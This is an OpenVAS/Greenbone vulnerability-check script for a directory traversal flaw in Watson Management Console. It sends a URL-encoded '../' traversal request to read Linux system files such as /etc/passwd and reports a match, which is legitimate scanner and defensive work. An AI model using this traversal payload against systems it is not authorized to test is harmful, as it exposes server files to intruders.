if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103641" );
	script_bugtraq_id( 57237 );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Watson Management Console Directory Traversal Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-01-10 13:28:43 +0100 (Thu, 10 Jan 2013)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_keys( "Host/runs_unixoide" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/57237" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/23995/" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "It has been found that Watson Management Console is prone to a
  directory traversal vulnerability. The issue is due to the server's
  failure to properly validate user supplied http requests." );
	script_tag( name: "impact", value: "This issue may allow an attacker to escape the web server root
  directory and view any web server readable files. Information acquired by exploiting this issue
  may be used to aid further attacks against a vulnerable system." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
url = "/index.cgi";
if(http_vuln_check( port: port, url: url, pattern: "<TITLE>Watson Management Console", usecache: TRUE )){
	files = traversal_files( "linux" );
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/" + file;
		if(http_vuln_check( port: port, url: url, pattern: "root:x:0:0:root:" )){
			report = http_report_vuln_url( url: url, port: port );
			security_message( data: report, port: port );
			exit( 0 );
		}
	}
}
exit( 0 );

